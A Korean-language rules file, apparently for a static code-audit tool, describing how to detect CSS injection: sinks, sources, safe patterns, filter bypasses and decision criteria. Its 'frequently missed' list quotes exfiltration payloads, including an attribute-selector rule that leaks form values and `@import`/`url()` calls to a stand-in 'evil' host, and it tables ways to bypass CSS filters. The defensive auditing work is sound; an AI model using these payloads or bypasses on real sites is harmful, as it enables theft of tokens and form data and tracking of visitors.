---
id_prefix: CSSI
rules_dir: rules/
---

> ## 핵심 원칙: "CSS 의미 단위가 탈출되지 않으면 취약점이 아니다"
>
> 사용자 입력이 style 속성에 반영된다는 것만으로 취약점이 아니다. CSS 구문(`;`/`}`/`url()`/`@import`)을 삽입해 declaration을 추가하거나, 저장된 입력이 타 사용자에게 노출되어 데이터 탈취/UI 조작이 실제로 가능해야 한다.

## Sink 의미론

CSS Injection sink는 "사용자 입력이 CSS 파서에 의해 declaration/selector/rule로 해석되는 지점"이다. CSS 변수(`element.style.setProperty('--x', value)`)는 값만 저장되고 구문 탈출이 어려워 sink 의미가 약하다.

| 컨텍스트 | sink 예시 |
|---|---|
| 인라인 style 값 | `style="color: ${x}"`, React `style={{color: x}}` (값 위치) |
| 인라인 style 속성명 | React `style={{[x]: 'red'}}` (키 위치 — 흔치 않음) |
| `<style>` 태그 본문 | `<style>.user { color: ${x}; }</style>` |
| 동적 stylesheet | `document.styleSheets[0].insertRule(\`${x}\`)`, `CSSStyleSheet.replaceSync(x)` |
| CSS-in-JS template | styled-components ``` styled.div`color: ${x}` ```, emotion `css\`...${x}...\`` |
| selector 위치 | `document.querySelector(\`.${x}\`)` (CSS injection은 아니지만 selector injection) |
| CSS 파일 동적 생성 | 서버에서 사용자 입력으로 `.css` 응답 생성 |

## Source-first 추가 패턴

- 테마/색상 커스터마이징 (사용자 지정 색상/폰트/배경)
- 프로필 설정 (배경색, 폰트)
- 이메일 HTML 템플릿의 사용자 스타일
- CMS의 "커스텀 CSS" 기능
- 위젯/임베드 코드 생성기
- 화이트라벨/멀티테넌시의 테마 입력

## 자주 놓치는 패턴 (Frequently Missed)

- **CSS exfiltration via attribute selector**: `input[value^="a"] { background: url(/log?c=a); }` — 사용자가 CSS 작성 가능한 환경에서 폼 값/CSRF 토큰을 1글자씩 추출. password manager 자동 입력 필드, CSRF token이 hidden input일 때 노출.
- **`@import url(//evil/log.css)`**: 외부 CSS 로드. data exfiltration 채널.
- **`background-image: url(//evil/?...)`**: 페이지 방문자의 IP/UA 추적. 익명성 침해.
- **`expression()` (IE 한정)**: 레거시지만 IE 호환 모드 잔존 시.
- **`-moz-binding`** (XBL, 구버전 Firefox).
- **font-face `src: url(...)`**: 외부 폰트 로드 + 정보 노출.
- **`@font-face` + `unicode-range`로 글자 단위 추출** (CSS exfiltration 변형).
- **CSS keyframes + animation으로 timing attack**.
- **`content: attr(...)`**: DOM 속성 값을 CSS로 노출.
- **selector specificity 조작으로 click-jacking style overlay**.
- **CSS-in-JS template literal 직접 보간**: ``` styled.div`color: ${props.color}` ``` — `props.color`가 사용자 입력이고 `;` 포함 시 declaration 추가.
- **dynamic class name이 CSS rule 본문이 되는 빌드 패턴** (CSS modules에서 흔치 않음).
- **SVG `<style>` 블록**: 사용자 업로드 SVG 내 `<style>`은 inline CSS로 취급되어 같은 origin 실행.
- **CSS Houdini Paint API**: `CSS.registerProperty`로 등록된 커스텀 property가 사용자 입력일 때 렌더링 조작.
- **CSS `:has()` / 고급 selector로 sibling 정보 추출**: 최신 브라우저 지원 selector로 exfiltration 채널 확대.
- **Print CSS media query (`@media print`)**: 화면 외 컨텍스트에서 다른 규칙 적용 — 감시 회피에 사용.

## 안전 패턴 (FP Guard)

- **enum/화이트리스트 검증**: `if (!ALLOWED_COLORS.includes(c)) reject`.
- **CSS color 정규식 검증**: `/^#[0-9a-fA-F]{3,8}$|^rgb\(...\)$/` 등 strict.
- **CSS variable + 값만 전달**: `element.style.setProperty('--user-color', value)` + 값에서 `;`/`}`/`url(`/`/*` 제거 또는 검증.
- **React `style={{color: validatedValue}}`**: React가 키는 카멜케이스로 강제, 값 보간만 가능. 단 값에 `url(...)`이 들어가면 background는 가능.
- **DOMPurify CSS 모드** (`ALLOWED_TAGS: []`+ `ALLOW_STYLE` 옵션 적절 설정).
- **Trusted Types `TrustedScriptURL`/CSP `style-src` strict** (`'self'` only, no `unsafe-inline`).
- **CSP `style-src` nonce/hash**.

## 우회 가능 패턴

방어 처리가 보이지만 우회 가능한 경우 후보 사유에 우회 방식을 함께 기록한다.

| 방어 코드 | 우회 가능성 | 우회 방식 |
|---|---|---|
| `;`/`}` 차단만 | 가능 | `url(...)` 함수 단독 삽입으로 외부 fetch (declaration 탈출 불필요) |
| `url()` 차단 | 가능 | `@import`, `@font-face` `src`, `image-set()`, `-webkit-image-set()`, `cursor: url(...)` 누락 시 |
| CSS variable `--x` + 값만 전달 | 부분 가능 | `var(--x)` 소비 지점이 `url(var(--x))` 형태면 여전히 외부 fetch 가능 |
| enum 검증 (`#[0-9a-f]+`) | 가능 | 공백/탭/주석 삽입 (`#fff/*...*/`) 일부 파서 허용. CSS 파서 관대함 이용 |
| CSP `style-src 'self'` | 부분 가능 | 같은 origin에 업로드 가능한 CSS 파일 있으면 `@import` 우회 |
| HTML escape만 (`<`/`>` escape) | 가능 | `"` escape 안 하면 속성 값 탈출, CSS 컨텍스트에선 HTML escape 효과 없음 |

## 후보 판정 의사결정

아래 3 조건 **모두** 만족 시 후보:

1. **CSS 파싱 컨텍스트 sink** (`<style>`, `style=`, CSSOM, 동적 stylesheet, CSS-in-JS, selector/클래스명/property name 위치 중 하나). HTML 텍스트/속성 sink는 XSS 범주이므로 제외.
2. **노출 범위가 입력 주체를 넘어섬**: 저장 후 타 사용자 노출 또는 제3자가 트리거 가능.
3. **검증/이스케이프 부재로 sink 의미 단위 탈출 가능**: 값 컨텍스트는 declaration 추가 또는 `url()`류 네트워크 함수 삽입, selector 컨텍스트는 selector 재작성 가능. 정규식/enum/타입 validator로 형식이 강제되면 미충족.

| 조건 | 판정 |
|---|---|
| 사용자 입력 → CSS 값 위치 + `;`/`}`/`url(` 차단 없음 + 타인 노출 | 후보 |
| CSS-in-JS template literal 직접 보간 + 화이트리스트 없음 | 후보 |
| `setProperty('--var', x)` + 값 검증 없음 | 후보 (영향도 낮음, declaration 탈출 어려움 → 라벨 명시) |
| Self-only (입력 주체만 봄) | 제외 |
| enum/strict regex 검증 확인 | 제외 |
| CSP `style-src` strict + nonce 확인 | 영향도 낮춤, 후보 유지하되 라벨 |

## 후보 판정 제한

위 3 조건을 모두 만족하는 경우만 후보. self-redirect/self-only 노출은 제외.
